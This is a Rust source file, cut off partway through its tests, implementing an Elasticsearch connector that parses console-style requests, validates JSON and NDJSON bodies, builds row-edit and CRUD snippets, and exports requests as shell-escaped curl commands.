//! Elasticsearch connector, modeled on Kibana's Dev Tools console: the
//! query input is a `METHOD /path` line plus an optional JSON body, sent to
//! the cluster as-is rather than limited to the Search API. Exposes only
//! `connector()` -- everything else here is this crate's own business.

use std::sync::Arc;

use async_trait::async_trait;

use tradar_connector_spi::{Connector, ConnectorDescriptor, Session};
use tradar_core::capability::Capability;
use tradar_core::storage::SavedConnection;
use tradar_query_workbench::query_driver::{
    self as query_driver, ColumnInfo, QueryDriver, QueryResult, SchemaInfo, Statement,
};
use tradar_query_workbench::query_engine::QueryEngine;

struct ElasticsearchDriver {
    base_url: String,
}

impl ElasticsearchDriver {
    fn new(base_url: &str) -> Self {
        Self {
            base_url: base_url.trim_end_matches('/').to_string(),
        }
    }
}

fn parse_query(query: &str) -> Option<(String, String, Option<String>)> {
    let mut lines = query.lines();
    let first = lines.next()?.trim();
    let mut parts = first.splitn(2, char::is_whitespace);
    let method = parts.next()?.to_string();
    let path = parts.next()?.trim().to_string();
    if method.is_empty() || path.is_empty() {
        return None;
    }
    let body = lines.collect::<Vec<_>>().join("\n");
    let body = body.trim();
    let body = if body.is_empty() {
        None
    } else {
        Some(body.to_string())
    };
    Some((method, path, body))
}

/// `Ok` when `body` is valid either as one JSON value, or as NDJSON -- one
/// JSON value per non-blank line, no separating commas -- the shape
/// `_bulk` and `_msearch` require instead of a single document. Checked as
/// a whole first (the common case, and what gives the clean single-value
/// parse error when it's actually meant to be one object); only re-checked
/// line by line if that fails, so an ordinary malformed single-object body
/// still reports the same error it always did rather than a confusing
/// per-line one.
fn validate_json_body(body: &str) -> Result<(), String> {
    if serde_json::from_str::<serde_json::Value>(body).is_ok() {
        return Ok(());
    }
    for line in body.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        if let Err(err) = serde_json::from_str::<serde_json::Value>(line) {
            return Err(format!("invalid JSON body: {err}"));
        }
    }
    Ok(())
}

/// Escapes a string for safe interpolation inside a *single-quoted* shell
/// argument, using the standard close-quote / escaped-literal-quote /
/// reopen-quote technique: every `'` becomes `'\''`. Nothing else is special
/// inside single quotes, so this is sufficient on its own.
fn shell_escape_single_quoted(s: &str) -> String {
    s.replace('\'', r"'\''")
}

/// One row per hit for a `_search`-shaped response (`hits.hits` present,
/// however many -- zero included), each `_id` merged alongside its
/// `_source` fields the same way a Mongo document already carries its own
/// `_id` -- what makes a search result addressable by
/// `QueryDriver::edit_source`/`edit_sql` at all instead of the whole
/// response being one opaque "document". `None` for anything that isn't
/// this shape (`_count`, `_cat`, `_cluster/health`, an error body, a single
/// `_doc` fetch), which keeps that response exactly as it always was --
/// the whole thing as one `Documents` entry -- since there's no per-row
/// structure in it to unwrap. Never drops a hit even if it's missing
/// `_source` (an explicit `"_source": false` in the request) -- that hit
/// just comes back as `{"_id": ...}` alone rather than disappearing.
fn unwrap_search_hits(json: &serde_json::Value) -> Option<Vec<serde_json::Value>> {
    let hits = json.get("hits")?.get("hits")?.as_array()?;
    Some(
        hits.iter()
            .map(|hit| {
                let mut doc = serde_json::Map::new();
                if let Some(id) = hit.get("_id") {
                    doc.insert("_id".to_string(), id.clone());
                }
                if let Some(serde_json::Value::Object(source)) = hit.get("_source") {
                    doc.extend(source.clone());
                }
                serde_json::Value::Object(doc)
            })
            .collect(),
    )
}

/// Turns a raw HTTP response (status + body text) into `execute()`'s
/// result -- pulled out of `execute` itself so the status-handling logic
/// is testable without a real cluster, the same reasoning `parse_query`/
/// `unwrap_search_hits` are already free functions for. A non-2xx status
/// (a malformed query, a missing index, bad auth, ...) used to come back
/// as `Ok(QueryResult::Documents)` the same as a real result -- the error
/// body just showed up in the results pane looking like data, since only
/// a transport-level failure (`request.send()`, in the caller) ever
/// surfaced as an actual error. ES's own error body (`{"error": {"type",
/// "reason", ...}}`) is the useful part, so it's shown pretty-printed
/// rather than discarded in favor of just the status code.
fn handle_response(status: reqwest::StatusCode, text: String) -> anyhow::Result<QueryResult> {
    // Most Elasticsearch APIs return JSON, but the `_cat` family (e.g.
    // `GET _cat/indices?v`) returns `text/plain` unless `format=json` is
    // passed -- fall back to wrapping the body as a JSON string rather
    // than erroring on a decode failure.
    let json = serde_json::from_str::<serde_json::Value>(&text)
        .unwrap_or_else(|_| serde_json::Value::String(text.clone()));
    if !status.is_success() {
        let detail = serde_json::to_string_pretty(&json).unwrap_or(text);
        anyhow::bail!("elasticsearch returned {status}\n{detail}");
    }
    // A `_search`-shaped response (`hits.hits` present, however many --
    // zero included) unwraps into one row per hit, same as a Mongo
    // `find()` returning one row per document; anything else (`_count`,
    // `_cat`, `_cluster/health`, a single `_doc` fetch) stays exactly as
    // it always has, the whole response as one `Documents` entry, since
    // there's no per-row structure to unwrap.
    match unwrap_search_hits(&json) {
        Some(docs) => Ok(QueryResult::Documents(docs)),
        None => Ok(QueryResult::Documents(vec![json])),
    }
}

/// Infers a JSON value for a value as it's displayed in the grid or typed
/// into the row-edit prompt: text that parses as JSON (a number,
/// `true`/`false`, `null`, or a typed-out array/object literal) is used as
/// that value, anything else -- the common case, an ordinary string field
/// -- becomes a JSON string. Unlike Mongo's `mongo_value_literal`, there's
/// no constructor-call syntax (`ObjectId(...)`) to special-case first: ES
/// has no such wrapper convention, ids/dates are already plain strings.
fn es_infer_value(value: &str) -> serde_json::Value {
    serde_json::from_str(value).unwrap_or_else(|_| serde_json::Value::String(value.to_string()))
}

/// Wraps `value` in a nested JSON object for each `.`-separated segment of
/// `path`, innermost segment last -- `nest_dotted_path("customer.name", v)`
/// gives `{"customer": {"name": v}}`. A bare `path` with no dot gives
/// `{path: v}` unchanged. See `edit_sql`'s doc comment for why a dotted ES
/// column name has to become real nesting rather than a literal flat key.
fn nest_dotted_path(path: &str, value: serde_json::Value) -> serde_json::Value {
    path.rsplit('.').fold(value, |acc, segment| {
        let mut map = serde_json::Map::new();
        map.insert(segment.to_string(), acc);
        serde_json::Value::Object(map)
    })
}

fn to_curl(base_url: &str, query: &str) -> Option<String> {
    let (method, path, body) = parse_query(query)?;
    let base_url = base_url.trim_end_matches('/');
    let url = format!("{base_url}/{}", path.trim_start_matches('/'));
    let url = shell_escape_single_quoted(&url);
    let method = method.to_uppercase();
    Some(match body {
        Some(body) => {
            let body = shell_escape_single_quoted(&body);
            format!("curl -X {method} '{url}' -H 'Content-Type: application/json' -d '{body}'")
        }
        None => format!("curl -X {method} '{url}'"),
    })
}

#[async_trait]
impl QueryDriver for ElasticsearchDriver {
    async fn connect(&mut self) -> anyhow::Result<()> {
        let response = reqwest::get(format!("{}/", self.base_url)).await?;
        if !response.status().is_success() {
            anyhow::bail!(
                "elasticsearch ping failed with status {}",
                response.status()
            );
        }
        Ok(())
    }

    /// The Dev-Tools-console vocabulary: HTTP verbs, the endpoints you
    /// reach for, and the Query-DSL keys that go in the body.
    fn keywords(&self) -> &'static [&'static str] {
        &[
            "GET",
            "POST",
            "PUT",
            "DELETE",
            "HEAD",
            // Endpoints. Not a closed set -- the driver forwards whatever
            // path is typed as-is (see the module docs) -- just the ones
            // reached for often enough to be worth completing.
            "_search",
            "_count",
            "_mapping",
            "_settings",
            "_cat/indices",
            "_cat/health",
            "_cat/nodes",
            "_cat/shards",
            "_cluster/health",
            "_bulk",
            "_doc",
            "_aliases",
            "_refresh",
            "_analyze",
            "_reindex",
            "_update_by_query",
            "_delete_by_query",
            "_forcemerge",
            "_close",
            "_open",
            "_template",
            // Query DSL.
            "query",
            "match",
            "match_all",
            "match_phrase",
            "multi_match",
            "term",
            "terms",
            "range",
            "regexp",
            "ids",
            "bool",
            "must",
            "must_not",
            "should",
            "filter",
            "minimum_should_match",
            "boost",
            "constant_score",
            "function_score",
            "aggs",
            "sort",
            "size",
            "from",
            "_source",
            "exists",
            "wildcard",
            "prefix",
            "fuzzy",
            "nested",
            "highlight",
            "script",
            "script_fields",
            "geo_distance",
            "geo_bounding_box",
            // Aggregations.
            "avg",
            "sum",
            "min",
            "max",
            "cardinality",
            "stats",
            "histogram",
            "date_histogram",
            "composite",
        ]
    }

    /// A request is a `METHOD /path` line plus the JSON body that follows
    /// it, so a new verb line starts a new statement -- the same rule
    /// Kibana's Dev Tools console uses. Blank lines between requests are
    /// ignored rather than treated as separators, since a pretty-printed
    /// body can contain them.
    fn split_statements(&self, text: &str) -> Vec<Statement> {
        let mut statements: Vec<Statement> = Vec::new();
        let mut offset = 0;
        for line in text.split_inclusive('\n') {
            let trimmed = line.trim();
            let line_start = offset + (line.len() - line.trim_start().len());
            offset += line.len();
            if trimmed.is_empty() {
                continue;
            }
            match (starts_request(trimmed), statements.last_mut()) {
                (false, Some(current)) => {
                    // Continuation of the request above: extend it to here.
                    current.end = line_start + trimmed.len();
                    current.text = text[current.start..current.end].trim_end().to_string();
                }
                _ => statements.push(Statement {
                    text: trimmed.to_string(),
                    start: line_start,
                    end: line_start + trimmed.len(),
                }),
            }
        }
        statements
    }

    async fn ping(&self) -> anyhow::Result<()> {
        let response = reqwest::get(format!("{}/", self.base_url)).await?;
        if !response.status().is_success() {
            anyhow::bail!(
                "elasticsearch ping failed with status {}",
                response.status()
            );
        }
        Ok(())
    }

    async fn list_schema(&self) -> anyhow::Result<Vec<SchemaInfo>> {
        let url = format!("{}/_cat/indices?format=json", self.base_url);
        let indices: Vec<serde_json::Value> = reqwest::get(&url).await?.json().await?;

        // One `_mapping` call covers every index, so index fields cost a
        // single extra round trip no matter how many indices there are.
        // Failing to read mappings must not fail schema browsing itself --
        // the index list is still useful without field detail.
        let mappings: serde_json::Value =
            match reqwest::get(format!("{}/_mapping", self.base_url)).await {
                Ok(response) => response.json().await.unwrap_or(serde_json::Value::Null),
                Err(_) => serde_json::Value::Null,
            };

        Ok(indices
            .into_iter()
            .filter_map(|entry| {
                let name = entry.get("index").and_then(|v| v.as_str())?;
                Some(SchemaInfo {
                    name: name.to_string(),
                    columns: index_fields(&mappings, name),
                    kind: None,
                    ttl: None,
                    // Elasticsearch has neither a schema level (indices
                    // are top-level) nor more than one object kind.
                    schema: None,
                    object_kind: None,
                })
            })
            .collect())
    }

    async fn execute(&self, query: &str) -> anyhow::Result<QueryResult> {
        let (method, path, body) = parse_query(query)
            .ok_or_else(|| anyhow::anyhow!("expected \"METHOD /path\" on the first line"))?;
        let method = reqwest::Method::from_bytes(method.to_uppercase().as_bytes())
            .map_err(|_| anyhow::anyhow!("unknown HTTP method: {method}"))?;
        let url = format!("{}/{}", self.base_url, path.trim_start_matches('/'));

        let client = reqwest::Client::new();
        let mut request = client.request(method, &url);
        if let Some(body) = &body {
            // Caught locally rather than left for Elasticsearch to reject
            // over the wire: malformed JSON never reaches the network, and
            // `serde_json`'s own error already carries a line/column
            // pointing at the mistake -- better than whatever error body
            // the cluster would otherwise send back for what is, from its
            // side, just an unparseable request. Also accepts NDJSON (one
            // JSON value per line, no commas between them) -- `_bulk` and
            // `_msearch` require exactly that shape, so a body that isn't
            // one JSON value as a whole is still checked line by line
            // before being rejected outright.
            if let Err(err) = validate_json_body(body) {
                return Err(anyhow::anyhow!(err));
            }
            request = request
                .header("Content-Type", "application/json")
                .body(body.clone());
        }
        let response = request.send().await?;
        let status = response.status();
        // Most Elasticsearch APIs return JSON, but the `_cat` family (e.g.
        // `GET _cat/indices?v`) returns `text/plain` unless `format=json` is
        // passed. Read the body as text first and fall back to wrapping it
        // as a JSON string rather than erroring on a decode failure.
        let text = response.text().await?;
        handle_response(status, text)
    }

    /// The single, named index a plain `_search` reads from -- conservative
    /// by the same "when in doubt, refuse" principle `single_table_source`
    /// uses for SQL: a comma-separated list, a `*` wildcard, or `_all`
    /// could span several indices, so there's no one source a generated
    /// `_update`/`DELETE` could safely aim at (a hit's own `_index`, not
    /// used here, would resolve that -- out of scope for now, see
    /// `docs/backlog/mongo-es-row-edit.md`). `POST` is accepted alongside
    /// `GET` since a body is what usually makes `_search` a `POST` in
    /// practice (Kibana's own console defaults to it).
    fn edit_source(&self, query: &str) -> Option<String> {
        let (method, path, _body) = parse_query(query)?;
        if !method.eq_ignore_ascii_case("GET") && !method.eq_ignore_ascii_case("POST") {
            return None;
        }
        let path = path.trim_start_matches('/');
        let path = path.split('?').next().unwrap_or(path);
        let index = path.strip_suffix("/_search")?;
        if index.is_empty()
            || index.contains(',')
            || index.contains('*')
            || index.eq_ignore_ascii_case("_all")
        {
            return None;
        }
        Some(index.to_string())
    }

    /// Builds the `_update`/`DELETE` this driver would run for `edit`,
    /// against the `_id` `edit.key` carries (the one field every `_search`
    /// hit is unwrapped with -- see `unwrap_search_hits`). A `SetValue`'s
    /// new value goes through `es_infer_value` (a number/bool/null/JSON
    /// literal passes through as typed, anything else becomes a JSON
    /// string) and, for a dotted column name (a nested field, ES's own
    /// flattening convention -- see `index_fields`), `nest_dotted_path`
    /// turns it into the real nested object `_update`'s `doc` merge needs
    /// (`_update` does a literal key merge with no path expansion of its
    /// own, so a flat `{"customer.name": v}` would create a spurious
    /// top-level field literally named `"customer.name"` instead of
    /// reaching the real nested field).
    fn edit_sql(&self, edit: &query_driver::RowEdit) -> Option<String> {
        let index = &edit.table;
        let id = edit.key.iter().find(|(k, _)| k == "_id")?.1.as_str();
        Some(match &edit.change {
            query_driver::RowChange::SetValue { column, value } => {
                let doc = nest_dotted_path(column, es_infer_value(value));
                let body = serde_json::json!({ "doc": doc });
                format!(
                    "POST {index}/_update/{id}\n{}",
                    serde_json::to_string_pretty(&body).unwrap_or_default()
                )
            }
            query_driver::RowChange::DeleteRow => format!("DELETE {index}/_doc/{id}"),
        })
    }

    /// Always `_id` -- see the trait method's own doc comment for why this
    /// can't come from `list_schema` the way it does for the SQL
    /// connectors and Mongo.
    fn edit_key_columns(&self, _source: &str) -> Option<Vec<String>> {
        Some(vec!["_id".to_string()])
    }

    fn export_curl(&self, query: &str) -> Option<String> {
        to_curl(&self.base_url, query)
    }

    fn crud_snippet(
        &self,
        entry: &SchemaInfo,
        op: tradar_core::action::CrudOp,
        columns: &[String],
    ) -> Option<String> {
        let index = &entry.name;
        let all_fields: Vec<&str> = entry.columns.iter().map(|c| c.name.as_str()).collect();

        // `columns` empty means "use this op's own default" -- same
        // convention as the SQL connectors' `build_crud_snippet`. ES has
        // no primary-key concept for a mapping's own fields, so
        // Create/Update's default is simply every known field (candidates
        // and default are the same slice); a selection matching no real
        // field falls back to that default. Delete has no per-field body
        // at all here (it deletes by `<id>` via the URL path, not a query
        // body -- filtering by field would mean switching to
        // `_delete_by_query`, a bulk-delete endpoint deliberately kept out
        // of scope), so `columns` is unused there.
        let pick =
            || -> Vec<&str> { query_driver::pick_columns(columns, &all_fields, &all_fields) };

        // One field per line, JSON-quoted keys (a real body ES parses,
        // not just display text) -- `indent` lets Create/Update nest it
        // at their own body depth.
        let field_lines = |fields: &[&str], indent: &str| -> String {
            fields
                .iter()
                .enumerate()
                .map(|(i, f)| {
                    let comma = if i + 1 < fields.len() { "," } else { "" };
                    format!("{indent}\"{}\": <value>{comma}", f.replace('"', "\\\""))
                })
                .collect::<Vec<_>>()
                .join("\n")
        };

        Some(match op {
            tradar_core::action::CrudOp::Read => {
                let picked: Vec<&str> = all_fields
                    .iter()
                    .copied()
                    .filter(|c| columns.iter().any(|s| s.as_str() == *c))
                    .collect();
                if picked.is_empty() {
                    format!(
                        "GET {index}/_search\n{{\n  \"query\": {{\n    \"match_all\": {{}}\n  }}\n}}"
                    )
                } else {
                    let source = picked
                        .iter()
                        .map(|c| format!("\"{}\"", c.replace('"', "\\\"")))
                        .collect::<Vec<_>>()
                        .join(", ");
                    format!(
                        "GET {index}/_search\n{{\n  \"_source\": [{source}],\n  \"query\": {{\n    \"match_all\": {{}}\n  }}\n}}"
                    )
                }
            }
            tradar_core::action::CrudOp::Create => {
                let fields = pick();
                if fields.is_empty() {
                    format!("POST {index}/_doc\n{{\n}}")
                } else {
                    format!("POST {index}/_doc\n{{\n{}\n}}", field_lines(&fields, "  "))
                }
            }
            tradar_core::action::CrudOp::Update => {
                let fields = pick();
                if fields.is_empty() {
                    format!("POST {index}/_update/<id>\n{{\n  \"doc\": {{\n  }}\n}}")
                } else {
                    format!(
                        "POST {index}/_update/<id>\n{{\n  \"doc\": {{\n{}\n  }}\n}}",
                        field_lines(&fields, "    ")
                    )
                }
            }
            tradar_core::action::CrudOp::Delete => format!("DELETE {index}/_doc/<id>"),
        })
    }
}

const DESCRIPTOR: ConnectorDescriptor = ConnectorDescriptor {
    id: "elasticsearch",
    display_name: "Elasticsearch",
    icon: "🔍",
    capabilities: &[Capability::Query, Capability::Schema, Capability::Export],
};

struct ElasticsearchConnector;

#[async_trait]
impl Connector for ElasticsearchConnector {
    fn descriptor(&self) -> &ConnectorDescriptor {
        &DESCRIPTOR
    }

    async fn connect(&self, connection: SavedConnection) -> anyhow::Result<Box<dyn Session>> {
        let mut driver = ElasticsearchDriver::new(&connection.target);
        tradar_connector_spi::with_connect_timeout(&connection.target, driver.connect()).await?;
        let driver: Arc<dyn QueryDriver> = Arc::new(driver);
        let schema = driver.list_schema().await.map_err(|e| e.to_string());
        Ok(Box::new(QueryEngine::new(driver, connection, schema)))
    }
}

pub fn connector() -> Box<dyn Connector> {
    Box::new(ElasticsearchConnector)
}

/// The fields of one index, read out of a `GET /_mapping` response.
fn index_fields(mappings: &serde_json::Value, index: &str) -> Vec<ColumnInfo> {
    let mut fields = Vec::new();
    if let Some(properties) = mappings
        .get(index)
        .and_then(|m| m.get("mappings"))
        .and_then(|m| m.get("properties"))
    {
        flatten_properties("", properties, &mut fields);
    }
    fields
}

/// Flattens a mapping's `properties` into `parent.child` paths, which is
/// how you refer to a nested field in a query anyway. An object node has
/// no `type` of its own, only more `properties`; a leaf's `type` is
/// reported as-is. Multi-fields (`fields`) are skipped: `title.keyword` is
/// an indexing detail rather than a field of the document.
fn flatten_properties(prefix: &str, properties: &serde_json::Value, out: &mut Vec<ColumnInfo>) {
    let Some(properties) = properties.as_object() else {
        return;
    };
    for (name, definition) in properties {
        let path = if prefix.is_empty() {
            name.clone()
        } else {
            format!("{prefix}.{name}")
        };
        match definition.get("properties") {
            Some(nested) => flatten_properties(&path, nested, out),
            None => out.push(ColumnInfo::new(
                path,
                definition
                    .get("type")
                    .and_then(|t| t.as_str())
                    .unwrap_or("object"),
            )),
        }
    }
}

/// Whether a line opens a new request: an HTTP verb followed by a path,
/// which is what separates one console request from the next.
fn starts_request(line: &str) -> bool {
    let mut words = line.split_whitespace();
    let Some(verb) = words.next() else {
        return false;
    };
    matches!(
        verb.to_ascii_uppercase().as_str(),
        "GET" | "POST" | "PUT" | "DELETE" | "HEAD" | "PATCH"
    ) && words.next().is_some()
}

#[cfg(test)]
mod tests {
    use super::*;
    use testcontainers_modules::elastic_search::ElasticSearch;
    use testcontainers_modules::testcontainers::runners::AsyncRunner;

    #[test]
    fn crud_snippet_covers_all_four_ops() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");
        let entry = SchemaInfo::new("my-index");

        assert_eq!(
            driver.crud_snippet(&entry, tradar_core::action::CrudOp::Read, &[]),
            Some(
                "GET my-index/_search\n{\n  \"query\": {\n    \"match_all\": {}\n  }\n}"
                    .to_string()
            )
        );
        assert_eq!(
            driver.crud_snippet(&entry, tradar_core::action::CrudOp::Create, &[]),
            Some("POST my-index/_doc\n{\n}".to_string())
        );
        assert_eq!(
            driver.crud_snippet(&entry, tradar_core::action::CrudOp::Update, &[]),
            Some("POST my-index/_update/<id>\n{\n  \"doc\": {\n  }\n}".to_string())
        );
        assert_eq!(
            driver.crud_snippet(&entry, tradar_core::action::CrudOp::Delete, &[]),
            Some("DELETE my-index/_doc/<id>".to_string())
        );
    }

    #[test]
    fn a_success_status_still_wraps_the_body_as_documents() {
        let result = handle_response(
            reqwest::StatusCode::OK,
            r#"{"status": "green"}"#.to_string(),
        )
        .unwrap();

        match result {
            QueryResult::Documents(docs) => {
                assert_eq!(docs, vec![serde_json::json!({"status": "green"})]);
            }
            other => panic!("expected Documents, got {other:?}"),
        }
    }

    #[test]
    fn a_non_success_status_is_an_error_not_a_result() {
        let body = r#"{"error": {"type": "index_not_found_exception", "reason": "no such index [orders]"}, "status": 404}"#;

        let err = handle_response(reqwest::StatusCode::NOT_FOUND, body.to_string()).unwrap_err();

        let text = err.to_string();
        assert!(text.contains("404"), "was: {text}");
        assert!(text.contains("index_not_found_exception"), "was: {text}");
        assert!(text.contains("no such index [orders]"), "was: {text}");
    }

    #[test]
    fn a_non_success_status_with_a_non_json_body_still_reports_it() {
        let err = handle_response(
            reqwest::StatusCode::INTERNAL_SERVER_ERROR,
            "upstream connect error".to_string(),
        )
        .unwrap_err();

        let text = err.to_string();
        assert!(text.contains("500"), "was: {text}");
        assert!(text.contains("upstream connect error"), "was: {text}");
    }

    #[test]
    fn a_success_status_with_the_cat_family_s_plain_text_body_still_works() {
        let result = handle_response(
            reqwest::StatusCode::OK,
            "health status index\ngreen  open   my-index".to_string(),
        )
        .unwrap();

        match result {
            QueryResult::Documents(docs) => {
                assert_eq!(docs.len(), 1);
                assert!(docs[0].is_string());
            }
            other => panic!("expected Documents, got {other:?}"),
        }
    }

    fn my_index_with_fields() -> SchemaInfo {
        SchemaInfo {
            name: "my-index".to_string(),
            columns: vec![
                ColumnInfo::new("title", "text"),
                ColumnInfo::new("views", "long"),
            ],
            kind: None,
            ttl: None,
            schema: None,
            object_kind: None,
        }
    }

    #[test]
    fn crud_snippet_create_with_a_real_mapping_lists_every_field() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        assert_eq!(
            driver.crud_snippet(
                &my_index_with_fields(),
                tradar_core::action::CrudOp::Create,
                &[]
            ),
            Some(
                "POST my-index/_doc\n{\n  \"title\": <value>,\n  \"views\": <value>\n}".to_string()
            )
        );
    }

    #[test]
    fn crud_snippet_create_with_an_explicit_selection_lists_only_those_fields() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        assert_eq!(
            driver.crud_snippet(
                &my_index_with_fields(),
                tradar_core::action::CrudOp::Create,
                &["title".to_string()]
            ),
            Some("POST my-index/_doc\n{\n  \"title\": <value>\n}".to_string())
        );
    }

    #[test]
    fn crud_snippet_read_with_a_selection_adds_a_source_filter() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        assert_eq!(
            driver.crud_snippet(
                &my_index_with_fields(),
                tradar_core::action::CrudOp::Read,
                &["title".to_string()]
            ),
            Some(
                "GET my-index/_search\n{\n  \"_source\": [\"title\"],\n  \"query\": {\n    \"match_all\": {}\n  }\n}"
                    .to_string()
            )
        );
    }

    #[test]
    fn crud_snippet_update_with_a_real_mapping_sets_every_field_in_the_doc_body() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        assert_eq!(
            driver.crud_snippet(
                &my_index_with_fields(),
                tradar_core::action::CrudOp::Update,
                &[]
            ),
            Some(
                "POST my-index/_update/<id>\n{\n  \"doc\": {\n    \"title\": <value>,\n    \"views\": <value>\n  }\n}"
                    .to_string()
            )
        );
    }

    #[test]
    fn crud_snippet_delete_ignores_columns_since_it_deletes_by_id_only() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        assert_eq!(
            driver.crud_snippet(
                &my_index_with_fields(),
                tradar_core::action::CrudOp::Delete,
                &["title".to_string()]
            ),
            Some("DELETE my-index/_doc/<id>".to_string())
        );
    }

    #[test]
    fn parse_query_splits_method_path_and_body() {
        let (method, path, body) =
            parse_query("POST my-index/_search\n{\"query\": {\"match_all\": {}}}").unwrap();

        assert_eq!(method, "POST");
        assert_eq!(path, "my-index/_search");
        assert_eq!(body.as_deref(), Some("{\"query\": {\"match_all\": {}}}"));
    }

    #[test]
    fn parse_query_allows_a_missing_body() {
        let (method, path, body) = parse_query("GET _cat/indices?v").unwrap();

        assert_eq!(method, "GET");
        assert_eq!(path, "_cat/indices?v");
        assert_eq!(body, None);
    }

    #[test]
    fn parse_query_rejects_a_missing_path() {
        assert!(parse_query("GET").is_none());
    }

    #[test]
    fn unwrap_search_hits_merges_id_into_each_hit_s_source() {
        let response = serde_json::json!({
            "took": 1,
            "hits": {
                "hits": [
                    {"_id": "1", "_index": "my-index", "_source": {"title": "a"}},
                    {"_id": "2", "_index": "my-index", "_source": {"title": "b"}},
                ]
            }
        });

        let docs = unwrap_search_hits(&response).expect("a hits.hits response");

        assert_eq!(
            docs,
            vec![
                serde_json::json!({"_id": "1", "title": "a"}),
                serde_json::json!({"_id": "2", "title": "b"}),
            ]
        );
    }

    #[test]
    fn unwrap_search_hits_is_none_for_a_response_with_no_hits_key() {
        assert!(unwrap_search_hits(&serde_json::json!({"count": 3})).is_none());
    }

    #[test]
    fn unwrap_search_hits_keeps_a_hit_missing_source_rather_than_dropping_it() {
        let response = serde_json::json!({"hits": {"hits": [{"_id": "1"}]}});

        let docs = unwrap_search_hits(&response).unwrap();

        assert_eq!(docs, vec![serde_json::json!({"_id": "1"})]);
    }

    #[test]
    fn edit_source_accepts_a_plain_single_index_search() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        assert_eq!(
            driver.edit_source("GET my-index/_search\n{\"query\": {\"match_all\": {}}}"),
            Some("my-index".to_string())
        );
        assert_eq!(
            driver.edit_source("POST my-index/_search"),
            Some("my-index".to_string())
        );
    }

    #[test]
    fn edit_source_refuses_multi_index_wildcard_and_non_search() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        assert_eq!(driver.edit_source("GET a,b/_search"), None);
        assert_eq!(driver.edit_source("GET my-*/_search"), None);
        assert_eq!(driver.edit_source("GET _all/_search"), None);
        assert_eq!(driver.edit_source("GET my-index/_count"), None);
        assert_eq!(driver.edit_source("GET my-index/_doc/1"), None);
        assert_eq!(driver.edit_source("DELETE my-index/_doc/1"), None);
    }

    #[test]
    fn edit_sql_delete_row_targets_the_hit_s_id() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        let edit = query_driver::RowEdit {
            table: "my-index".to_string(),
            key: vec![("_id".to_string(), "abc123".to_string())],
            change: query_driver::RowChange::DeleteRow,
        };

        assert_eq!(
            driver.edit_sql(&edit),
            Some("DELETE my-index/_doc/abc123".to_string())
        );
    }

    #[test]
    fn edit_sql_set_value_infers_the_value_s_json_type() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");
        let edit_for = |value: &str| query_driver::RowEdit {
            table: "my-index".to_string(),
            key: vec![("_id".to_string(), "1".to_string())],
            change: query_driver::RowChange::SetValue {
                column: "views".to_string(),
                value: value.to_string(),
            },
        };

        assert_eq!(
            driver.edit_sql(&edit_for("42")),
            Some("POST my-index/_update/1\n{\n  \"doc\": {\n    \"views\": 42\n  }\n}".to_string())
        );
        assert_eq!(
            driver.edit_sql(&edit_for("Ada")),
            Some(
                "POST my-index/_update/1\n{\n  \"doc\": {\n    \"views\": \"Ada\"\n  }\n}"
                    .to_string()
            )
        );
    }

    #[test]
    fn edit_sql_set_value_nests_a_dotted_column_into_a_real_object() {
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        let edit = query_driver::RowEdit {
            table: "my-index".to_string(),
            key: vec![("_id".to_string(), "1".to_string())],
            change: query_driver::RowChange::SetValue {
                column: "customer.name".to_string(),
                value: "Ada".to_string(),
            },
        };

        // Not a flat "customer.name" key -- a real nested object, or
        // Elasticsearch's partial-update merge would create a spurious
        // top-level field instead of reaching the real nested one.
        assert_eq!(
            driver.edit_sql(&edit),
            Some(
                "POST my-index/_update/1\n{\n  \"doc\": {\n    \"customer\": {\n      \"name\": \"Ada\"\n    }\n  }\n}"
                    .to_string()
            )
        );
    }

    #[test]
    fn validate_json_body_accepts_a_single_json_object() {
        assert_eq!(
            validate_json_body(r#"{"query": {"match_all": {}}}"#),
            Ok(())
        );
    }

    #[test]
    fn validate_json_body_accepts_ndjson_for_bulk_and_msearch() {
        let bulk = "{\"index\": {\"_index\": \"my-index\"}}\n{\"field\": \"value\"}";
        assert_eq!(validate_json_body(bulk), Ok(()));
    }

    #[test]
    fn validate_json_body_accepts_ndjson_with_blank_lines_between_entries() {
        let bulk = "{\"index\": {}}\n\n{\"field\": \"value\"}\n";
        assert_eq!(validate_json_body(bulk), Ok(()));
    }

    #[test]
    fn validate_json_body_rejects_a_malformed_single_object() {
        assert!(validate_json_body(r#"{"query": {"match_all": {}}"#).is_err());
    }

    #[test]
    fn validate_json_body_rejects_ndjson_with_one_bad_line() {
        let bulk = "{\"index\": {}}\n{not json}";
        assert!(validate_json_body(bulk).is_err());
    }

    #[tokio::test]
    async fn execute_accepts_an_ndjson_bulk_body_rather_than_rejecting_it_as_invalid_json() {
        // Same unroutable-host trick as the test below: if this reached
        // `request.send()` it's proof the NDJSON body passed local
        // validation (a connection-refused/timeout error here, not
        // "invalid JSON body").
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        let err = driver
            .execute("POST _bulk\n{\"index\": {\"_index\": \"my-index\"}}\n{\"field\": \"value\"}")
            .await
            .unwrap_err();

        assert!(
            !err.to_string().contains("invalid JSON body"),
            "a valid NDJSON bulk body must not be rejected as malformed JSON, got: {err}"
        );
    }

    #[tokio::test]
    async fn execute_rejects_malformed_json_locally_without_touching_the_network() {
        // The target host is unroutable (port 1, never a real server) --
        // if this reached `request.send()` it would hang/fail on a
        // connection error instead of the JSON error asserted below, so a
        // network-shaped error here would mean the local validation was
        // skipped, not that it's slow.
        let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

        let err = driver
            .execute("POST my-index/_search\n{\"query\": {\"match_all\": {}}")
            .await
            .unwrap_err();

        assert!(
            err.to_string().contains("invalid JSON body"),
            "expected a local JSON error, got: {err}"
        );
    }

    #[tokio::test]
    async fn connect_succeeds_for_a_running_cluster() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
